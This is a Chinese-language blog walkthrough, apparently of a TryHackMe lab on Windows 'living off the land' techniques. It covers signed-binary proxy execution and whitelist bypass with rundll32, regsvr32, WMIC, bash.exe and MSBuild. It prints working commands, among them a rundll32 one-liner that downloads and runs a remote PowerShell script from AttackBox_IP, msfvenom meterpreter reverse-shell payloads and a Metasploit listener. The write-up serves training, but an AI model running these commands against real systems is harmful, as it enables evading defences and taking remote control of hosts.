+<p>文件资源管理器是Windows的文件管理器和系统组件。人们发现使用文件资源管理器二进制文件可以执行其他.exe文件。此技术称为间接命令执行，其中可以使用和滥用explorer.exe工具从受信任的父进程启动恶意脚本或可执行文件。</p>
+<h2 id='文件管理器'>文件管理器<a href='#%e6%96%87%e4%bb%b6%e7%ae%a1%e7%90%86%e5%99%a8' class='anchor'>#</a>
+</h2><p>explorer.exe二进制文件位于：</p>
+<ul>
+<li>C：\Windows\explorer.exe 表示 Windows 32 位版本</li>
+<li>C：\Windows\SysWOW64\explorer.exe 为 Windows 64 位版本</li>
+</ul>
+<p>为了创建explorer.exe父进程的子进程，我们可以执行以下命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt; explorer.exe /root,&#34;C:\Windows\System32\calc.exe&#34;
+</span></span></code></pre></div><p>作为上一个命令的结果，我们在桌面上弹出了计算器。</p>
+<h3 id='wmic'>WMIC<a href='#wmic' class='anchor'>#</a>
+</h3><p>Windows Management Instrumentation （WMIC） 是用于管理 Windows 组件的 Windows 命令行实用工具。人们发现WMIC也被用来执行二进制文件以逃避防御措施。MITRE ATT&amp;CK 框架将此技术称为签名二进制代理执行 （T1218）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt;wmic.exe process call create calc
+</span></span><span style="display:flex;"><span>Executing (Win32_Process)-&gt;Create()
+</span></span><span style="display:flex;"><span>Method execution successful.
+</span></span><span style="display:flex;"><span>Out Parameters:
+</span></span><span style="display:flex;"><span>instance of __PARAMETERS
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>        ProcessId = 1740;
+</span></span><span style="display:flex;"><span>        ReturnValue = 0;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>C:\Users\thm&gt;
+</span></span></code></pre></div><p>前面的 WMIC 命令创建我们选择的二进制文件的新进程，在本例中为 calc.exe。</p>
+<h2 id='rundll32'>Rundll32<a href='#rundll32' class='anchor'>#</a>
+</h2><p>Rundll32 是一个 Microsoft 内置工具，可在操作系统中加载和运行动态链接库 DLL 文件。红队可以滥用和利用 rundll32.exe 来运行任意有效负载并执行 JavaScript 和 PowerShell 脚本。MITRE ATT&amp;CK 框架将其标识为签名二进制代理执行：Rundll32，并将其称为 T1218.</p>
+<p>rundll32.exe二进制文件位于：</p>
+<ul>
+<li>C：\Windows\System32\rundll32.exe 表示 Windows 32 位版本</li>
+<li>C：\Windows\SysWOW64\rundll32.exe 为 Windows 64 位版本</li>
+</ul>
+<p>现在，让我们尝试使用rundll32.exe二进制文件执行calc.exe二进制文件作为概念证明：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt; rundll32.exe javascript:&#34;\..\mshtml.dll,RunHTMLApplication &#34;;eval(&#34;w=new ActiveXObject(\&#34;WScript.Shell\&#34;);w.run(\&#34;calc\&#34;);window.close()&#34;);
+</span></span></code></pre></div><p>在前面的命令中，我们使用了嵌入 JavaScript 组件 eval（） 的 rundll32.exe 二进制文件来执行calc.exe二进制文件，即Microsoft计算器。</p>
+<p>如前所述，我们还可以使用rundll32.exe执行 PowerShell 脚本。以下命令运行一个 JavaScript，该 JavaScript 执行 PowerShell 脚本，以便使用 rundll32.exe 从远程网站下载.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt; rundll32.exe javascript:&#34;\..\mshtml,RunHTMLApplication &#34;;document.write();new%20ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://AttackBox_IP/script.ps1&#39;);&#34;);
+</span></span></code></pre></div><p>由于上一次执行，script.ps1 的副本已下载到目标计算机上的内存中。</p>
+<h1 id='任务六'>任务六<a href='#%e4%bb%bb%e5%8a%a1%e5%85%ad' class='anchor'>#</a>
+</h1><h2 id='应用程序白名单绕过'>应用程序白名单绕过<a href='#%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f%e7%99%bd%e5%90%8d%e5%8d%95%e7%bb%95%e8%bf%87' class='anchor'>#</a>
+</h2><p>应用程序白名单是 Microsoft 终结点安全功能，可防止恶意和未经授权的程序实时执行。应用程序白名单是基于规则的，它指定允许在操作系统上存在和执行的已批准应用程序或可执行文件的列表。此任务重点介绍用于绕过 Windows 应用程序白名单的 LOLBAS 示例。</p>
+<h3 id='regsvr32'>Regsvr32<a href='#regsvr32' class='anchor'>#</a>
+</h3><p>Regsvr32 is a Microsoft command-line tool to register and unregister Dynamic Link Libraries (DLLs)  in the Windows Registry. The regsvr.exe binary is located at:</p>
+<ul>
+<li>C：\Windows\System32\regsvr32.exe 表示 Windows 32 位版本</li>
+<li>C：\Windows\SysWOW64\regsvr32.exe 为 Windows 64 位版本</li>
+</ul>
+<p>除了其预期用途外，regsvr32.exe二进制文件还可用于执行任意二进制文件并绕过 Windows 应用程序白名单。根据 Red Canary 的报告，regsvr32.exe二进制文件是第三大最流行的 ATT&amp;CK 技术。攻击者利用regsvr32.exe在本地或远程执行本机代码或脚本。regsvr32.exe中使用的技术使用受信任的 Windows 操作系统组件并在内存中执行，这也是此技术也用于绕过应用程序白名单的原因之一。</p>
+<p>让我们尝试在现实生活中应用这种技术。首先，我们需要使用 msvenom 创建一个恶意 DLL 文件，并设置我们的 Metasploit 侦听器以接收反向 shell。请注意，我们将创建一个适用于 32 位操作系统的恶意文件。我们将使用 regsvr32.exe 应用程序白名单绕过技术在目标系统上运行命令。</p>
+<p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403180802.png"
+  alt=""
+  class=""/>
+
+请注意，我们使用 the-f 参数将输出类型指定为 DLL。生成恶意 DLL 文件后，我们需要将有效负载传送到受害计算机。我们将通过使用 Web 服务器在攻击机器上提供 DLL 文件来做到这一点，如下所示：
+这里推荐 updog 工具，将我们生成的 dll 文件传输到目标机器然后使用 regsvr32.exe 来执行：</p>
+<pre tabindex="0"><code>C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll or C:\Users\thm&gt; c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll 
+</code></pre><p>对于第二个选项（更高级的命令），我们指示regsvr32.exe运行：</p>
+<ul>
+<li>/s：处于静音模式（不显示消息）</li>
+<li>/n：不调用 DLL 寄存器服务器</li>
+<li>/i：： 使用另一台服务器，因为我们使用了 /n</li>
+<li>/u：使用 unregister 方法运行</li>
+</ul>
+<p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403181051.png"
+  alt=""
+  class=""/>
+</p>
+<p>目标机器返回 shell</p>
+<p>请注意，如果我们要创建一个 64 位 DLL 版本，我们需要在 msfvenom 命令中指定它，并使用位于 C：\Windows\SysWOW64\regsvr32.exe 的 64 位版本的 regsvr32.exe 从受害计算机运行它。</p>
+<p>Bourne Again Shell （Bash）</p>
+<p>2016 年，Microsoft 在 Windows 10、11 和 Server 2019 上增加了对 Linux 环境的支持。此功能称为适用于 Linux 的 Windows 子系统 （WSL），它存在于两个 WSL 版本中：WSL1 和 WSL2。WSL 是在操作系统上运行的 Hyper-V 虚拟化 Linux 发行版，支持 Linux 内核和系统调用的子集。此功能是用户可以安装并与 Linux 发行版交互的插件。作为 WSL 的一部分，bash.exe 是用于与 Linux 环境交互的Microsoft工具。</p>
+<p>人们找到了执行有效负载并绕过Windows应用程序白名单的方法，因为它是Microsoft签名的二进制文件。通过执行 -c bash.exe “path-to-payload”，我们可以执行任何未签名的有效负载。ATT&amp;CK 称其为间接命令执行技术，攻击者滥用 Windows 工具实用程序来获取命令执行。有关此技术的更多信息，您可以访问 T1202 ATT&amp;CK 网站。</p>
+<p><img
+  src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0468b54d6174a620d130adb1edacc1c.png"
+  alt=""
+  class=""/>
+</p>
+<p>请注意，需要在 Windows 10 中启用并安装适用于 Linux 的 Windows 子系统才能使用 bash.exe 二进制文件。此外，由于嵌套虚拟化限制，附加的 VM 未启用 Linux 子系统。</p>
+<p>请记住，本节重点介绍了几个有趣的工具。如果您有兴趣查看可用的 LOLBAS 工具，您可以访问项目网站。</p>
+<h1 id='任务七'>任务七<a href='#%e4%bb%bb%e5%8a%a1%e4%b8%83' class='anchor'>#</a>
+</h1><h2 id='其他应用技术'>其他应用技术<a href='#%e5%85%b6%e4%bb%96%e5%ba%94%e7%94%a8%e6%8a%80%e6%9c%af' class='anchor'>#</a>
+</h2><p>本部分重点介绍一些有趣的技术，无论是用于初始访问还是持久性。以下技术属于 Living Off the Land 保护伞，因为它们可以用作 Windows 环境实用程序的一部分。</p>
+<h2 id='nopowershell'>Nopowershell!<a href='#nopowershell' class='anchor'>#</a>
+</h2><p>019 年，Red Canary 发布了一份威胁检测报告，指出 PowerShell 是恶意活动最常用的技术。因此，组织开始监视或阻止执行powershell.exe。因此，攻击者会找到其他方法来运行 PowerShell 代码，而无需生成它。</p>
+<p>PowerLessShell 是一种基于 Python 的工具，它生成恶意代码以在目标计算机上运行，而不会显示 PowerShell 进程的实例。PowerLessShell 依赖于滥用 Microsoft 生成引擎 （MSBuild）（用于生成 Windows 应用程序的平台）来执行远程代码。</p>
+<p>首先，让我们将项目的副本从 GitHub 存储库下载到 AttackBox 上：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@machine$ git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
+</span></span></code></pre></div><p>项目要求之一是获取 PowerShell 有效负载，使其适合与 MSBuild 配合使用。在 AttackBox 上，我们需要使用 msfvenom 生成 PowerShell 有效负载，如下所示：
+<img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403182036.png"
+  alt=""
+  class=""/>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>user@machine$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection &gt; liv0ff.ps1
+</span></span></code></pre></div><p>此外，我们需要运行 Metasploit 框架来侦听并等待反向 shell。
+ </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>user@machine$ msfconsole -q -x &#34;use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit&#34;
+</span></span></code></pre></div><p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403182200.png"
+  alt=""
+  class=""/>
+</p>
+<p>现在，我们已准备好有效负载，请更改为 PowerLessShell 目录项目，以将有效负载转换为与 MSBuild 工具兼容。然后运行 PowerLessShell 工具，并将源文件设置为我们使用 msfvenom 创建的文件，如下所示：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>user@machine$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
+</span></span></code></pre></div><p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403182319.png"
+  alt=""
+  class=""/>
+</p>
+<p>使用 updog 传输到目标机器，最后，在目标 Windows 计算机上，生成 .csproj 文件并等待反向 shell！</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>C:\Users\thm&gt; c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
+</span></span></code></pre></div><p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403183048.png"
+  alt=""
+  class=""/>
+</p>
+<p><img
+  src="https://raw.githubusercontent.com/likeusosad/badwichellimg/main/20240403183107.png"
+  alt=""
+  class=""/>
+</p>
+<p>成功上线！
+![[Pasted image 20240403183236.png]]
+拿到旗帜</p>
+</div><div class="column is-sticky is-paddingless" id="tocWrapper">
+  <div class="is-paddingless" id="tocContainer">
+    <div class="toc-header">
+      <h6 class="toc-title is-marginless">On this page:</h6>
+      <i
+        title="Back to top"
+        id="tocBackToTop"
+        class="fa-solid fa-circle-arrow-up"
+      ></i>
+    </div>
+    <div id="tocContent">
+      <div id="toc"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#介绍">介绍</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#windows-内部系统">windows 内部系统</a></li>
+    <li><a href="#sysinternals-实时">Sysinternals 实时</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#lolbas-项目"> LOLBAS 项目</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#文件操作">文件操作</a>
+      <ul>
+        <li><a href="#问答">问答</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#文件执行">文件执行</a></li>
+    <li><a href="#文件管理器">文件管理器</a>
+      <ul>
+        <li><a href="#wmic">WMIC</a></li>
+      </ul>
+    </li>
+    <li><a href="#rundll32">Rundll32</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#应用程序白名单绕过">应用程序白名单绕过</a>
+      <ul>
+        <li><a href="#regsvr32">Regsvr32</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#其他应用技术">其他应用技术</a></li>
+    <li><a href="#nopowershell">Nopowershell!</a></li>
+  </ul>
+</nav></div>
+      <div id="taxonomies"><div class="taxonomy-wrapper"><div class="toc-header">
+                  <h6 class="toc-title is-marginless">Categories</h6>
+                </div><a href="/categories/tryhackme/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>Tryhackme</a
+                  ></div><div class="taxonomy-wrapper"><div class="toc-header">
+                  <h6 class="toc-title is-marginless">Tags</h6>
+                </div><a href="/tags/windows/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>Windows</a
+                  ><a href="/tags/tryhackme/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>Tryhackme</a
+                  ><a href="/tags/%E7%BB%95%E8%BF%87-uac/" class="taxonomy"
+                    ><i class="fa-solid fa-circle-dot"></i>绕过 UAC</a
+                  ></div></div>
+    </div>
+  </div>
+  <div
+    class="is-paddingless"
+    id="tocCollapsible"
+    title="Collapse/Uncollapse table of contents"
+  >
+    <i class="fa-solid fa-angles-right fa-lg"></i>
+  </div>
+</div>
+</div>
+</div><script type='text/javascript'>
+  const baseUrl = 'https:\/\/example.org\/';
+  const codeCopyBefore = 'Copy to clipboard';
+  const codeCopyAfter = 'Copied to clipboard';
+  const svgDownloadLabel = 'Download as SVG';
+  const helperLoadingLabel = 'Loading';
+  const searchNoResults = 'No result found';
+  const introNextLabel = 'Next';
+  const introPrevLabel = 'Previous';
+  const introSkipLabel = '✗';
+  const introDoneLabel = 'Done';
+  const printLabel = 'Print current page';
+  const qrCodeLabel = 'Show current page QR code';
+  const naCommonLabel = 'Not available';
+</script>
+<script
+      type="module"
+      src="/js/theme/modules/const.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/modules/helpers.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/modules/helpersGlobal.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/init.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/navbar.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/print.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/qrcode.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/search.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/shortcuts.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/sidebar.min.js"
+    ></script><script
+      type="module"
+      src="/js/theme/toc.min.js"
+    ></script><script
+      type="text/javascript"
+      src="/js/theme/browserCompatibility.min.js"
+    ></script><script
+      type="text/javascript"
+      src="/js/external/flexsearch/flexsearch.bundle.min.js"
+    ></script><script
+      type="text/javascript"
+      src="/js/external/qrious/qrious.min.js"
+    ></script><script
+      type="text/javascript"
+      src="/js/external/overlay-scrollbars/overlayscrollbars.min.js"
+    ></script>
+</body>
+</html>
